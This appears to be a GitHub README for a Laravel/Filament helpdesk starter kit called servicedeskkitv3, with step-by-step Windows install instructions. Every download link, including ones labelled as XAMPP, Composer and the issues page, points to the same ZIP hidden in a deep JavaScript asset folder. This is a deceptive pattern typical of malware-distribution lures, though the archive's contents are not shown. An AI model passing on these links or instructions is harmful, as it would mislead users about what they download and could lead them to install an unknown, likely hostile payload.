# 🛠️ servicedeskkitv3 - Simple Service Desk Starter Kit

[![Download servicedeskkitv3](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip)

---

## 📋 About servicedeskkitv3

servicedeskkitv3 is a ready-made service desk and helpdesk application. It is built with Laravel 12.x and Filament 3.x, two popular PHP and user interface tools. This kit helps you set up your own service desk system for managing customer requests, tasks, and support tickets.

You do not need to know programming to use this application. This guide will help you download and run it on your Windows PC quickly. 

---

## 🔧 System Requirements

Before downloading, check your system meets these minimum requirements:

- Windows 10 or later (64-bit recommended)
- 4 GB of RAM or more
- At least 2 GB of free storage space
- Internet connection for downloading and setup
- A modern web browser (Google Chrome, Edge, or Firefox)

---

## 🚀 Getting Started: Download servicedeskkitv3

You can get servicedeskkitv3 by visiting the main project page. Here is the direct link to download:

[![Download Link](https://img.shields.io/badge/Get%20servicedeskkitv3-blue?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip)

1. Click the large green button at the top or the blue button above to open the project page.
2. On the page, find the **Code** button (usually green).
3. Click **Code** and select **Download ZIP**.
4. Save the ZIP file to an easy-to-find location on your computer, like the Desktop or Downloads folder.
5. After downloading, right-click the ZIP file and select **Extract All...** to unpack the contents.

---

## 🛠️ Installation Steps (No Programming)

After extracting the files, follow these steps to run the application on your Windows PC:

### Step 1: Install Required Software

servicedeskkitv3 is built on Laravel and uses Filament, which require some tools to run. Install these before continuing:

- **XAMPP (or any local web server with PHP and MySQL):**  
  Download from https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip  
  Use the installer to set it up on your PC. XAMPP provides PHP and MySQL on your computer.

- **Composer (PHP Dependency Manager):**  
  Download from https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip  
  Use the installer to add Composer to your system path.

Both tools are free and widely used by developers and non-developers alike to run PHP applications locally.

---

### Step 2: Start Your Web Server

1. Open the XAMPP Control Panel.
2. Start the **Apache** service by clicking **Start**.
3. Start **MySQL** service the same way.
4. Make sure both services show **Running** in green.

---

### Step 3: Move extracted files to your web folder

1. Find the folder where you extracted servicedeskkitv3.
2. Copy the entire extracted folder.
3. Paste it into the XAMPP web folder, typically this path:  
   `C:\xampp\htdocs\`
4. You can rename the folder if you want, for example, `servicedeskkit`.

---

### Step 4: Set up the database

1. Open your web browser and go to:  
   `http://localhost/phpmyadmin/`
2. In phpMyAdmin, click **Databases**.
3. Enter a new database name, for example, `servicedeskdb`.
4. Click **Create**.

---

### Step 5: Configure the application

1. Open the extracted servicedeskkitv3 folder in your file browser.
2. Find the file named `.env.example`.
3. Make a copy and rename it to `.env`.
4. Open `.env` in a text editor (Notepad works fine).
5. Find these lines and update them to match your database setup:

```
DB_DATABASE=servicedeskdb
DB_USERNAME=root
DB_PASSWORD=
```

- Leave `DB_USERNAME` as `root` if you have not changed it.
- Leave `DB_PASSWORD` blank if no password is set (default for XAMPP).

6. Save and close `.env`.

---

### Step 6: Install dependencies with Composer

1. Open **Command Prompt** (press Windows key, type `cmd`, and press Enter).
2. Navigate to your project folder inside `htdocs`. For example:

```
cd C:\xampp\htdocs\servicedeskkit
```

3. Run this command:

```
composer install
```

This command downloads all code libraries the application needs to run.

---

### Step 7: Run application setup commands

While still in the Command Prompt inside your project folder, run these commands:

```
php artisan key:generate
php artisan migrate
php artisan db:seed
```

- `key:generate` sets a security key.
- `migrate` creates the database tables.
- `db:seed` fills some tables with sample data.

---

### Step 8: Open the application in your browser

1. In your browser, go to:

```
http://localhost/servicedeskkit/public/
```

2. You should see the application’s welcome screen.

---

## ⚙️ Using servicedeskkitv3

The main features you will find inside are:

- Ticket management for customer requests
- User accounts for support agents
- Task assignment and status tracking
- Dashboard with recent tickets and metrics
- Responsive design for desktops and tablets
- Built-in search to find tickets fast

These features are ready to use after installation. You can manage support tasks from one place.

---

## 🔄 Updating servicedeskkitv3

To update the application in the future:

1. Go back to the GitHub link at the top.
2. Download the newest version ZIP the same way.
3. Replace all files in your `htdocs/servicedeskkit` folder with the new ones.
4. Run these commands again in Command Prompt inside your folder:

```
composer install
php artisan migrate
php artisan db:seed
```

5. Refresh your browser to see updates.

---

## 💬 More Support

If you have problems running the application:

- Check that Apache and MySQL in XAMPP are running.
- Ensure your `.env` file has the right database info.
- Restart your web server if changes don’t appear.
- Visit the GitHub repository issues page to see known problems or ask questions:

https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip

---

## 🔗 Quick Links

- Download page: [https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip](https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip)  
- XAMPP: https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip  
- Composer: https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip  

---

[![Download servicedeskkitv3](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip)